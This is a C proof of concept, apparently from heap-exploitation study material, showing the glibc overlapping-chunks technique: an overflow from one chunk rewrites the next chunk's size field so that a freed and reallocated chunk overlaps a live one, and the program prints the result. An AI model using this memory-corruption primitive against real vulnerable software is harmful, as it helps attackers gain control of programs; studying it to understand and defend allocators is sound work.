#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <malloc.h>

int main() {
	intptr_t *p1, *p2, *p3, *p4, *p5, *p6;
	unsigned int real_size_p1, real_size_p2, real_size_p3, real_size_p4, real_size_p5, real_size_p6;
	int prev_in_use = 0x1;

	p1 = malloc(0x10);
	p2 = malloc(0x80);
	p3 = malloc(0x80);
	p4 = malloc(0x80);
	p5 = malloc(0x10);
	real_size_p1 = malloc_usable_size(p1);
	real_size_p2 = malloc_usable_size(p2);
	real_size_p3 = malloc_usable_size(p3);
	real_size_p4 = malloc_usable_size(p4);
	real_size_p5 = malloc_usable_size(p5);
	fprintf(stderr, "malloc five chunks:\n");
	fprintf(stderr, "p1: %p ~ %p, size: %p (overflow)\n", p1, (void *)p1+real_size_p1, (void *)p1[-1]);
	fprintf(stderr, "p2: %p ~ %p, size: %p (overwrite)\n", p2, (void *)p2+real_size_p2, (void *)p2[-1]);
	fprintf(stderr, "p3: %p ~ %p, size: %p (target)\n", p3, (void *)p3+real_size_p3, (void *)p3[-1]);
	fprintf(stderr, "p4: %p ~ %p, size: %p (free)\n", p4, (void *)p4+real_size_p4, (void *)p4[-1]);
	fprintf(stderr, "p5: %p ~ %p, size: %p\n\n", p5, (void *)p5+real_size_p5, (void *)p5[-1]);

	/*
	int *t1[10], *t2[10], i;					// tcache
	for (i = 0; i < 7; i++) {
		t1[i] = malloc(0x80);
		t2[i] = malloc(0x110);
	}
	for (i = 0; i < 7; i++) {
		free(t1[i]);
		free(t2[i]);
	} */

	free(p4);
	fprintf(stderr, "free the chunk p4\n");

	*(unsigned int *)((void *)p1 + real_size_p1) = real_size_p2 + real_size_p3 + prev_in_use + 0x10;
	fprintf(stderr, "overwrite chunk p2's size: %p (chunk_p2 + chunk_p3)\n", (void *)p2[-1]);

	free(p2);
	fprintf(stderr, "free the chunk p2, it will create a big free chunk, size: %p\n\n", (void *)p2[-1]);

	p6 = malloc(0x1b0 - 0x10);
	real_size_p6 = malloc_usable_size(p6);
	fprintf(stderr, "malloc(0x1b0 - 0x10) for chunk p6\n");
	fprintf(stderr, "p6: %p ~ %p, size: %p\n", p6, (void *)p6+real_size_p6, (void *)p6[-1]);
	fprintf(stderr, "p3: %p ~ %p, size: %p\n", p3, (void *)p3+real_size_p3, (void *)p3[-1]);
	fprintf(stderr, "p4: %p ~ %p, size: %p\n\n", p4, (void *)p4+real_size_p4, (void *)p4[-1]);

	memset(p6, 'A', 0xd0);
	memset(p3, 'B', 0x20);
    fprintf(stderr, "if we memset(p6, 'A', 0xd0) and memset(p3, 'B', 0x20):\n");
	fprintf(stderr, "p3 = %s\n", (char *)p3);
}
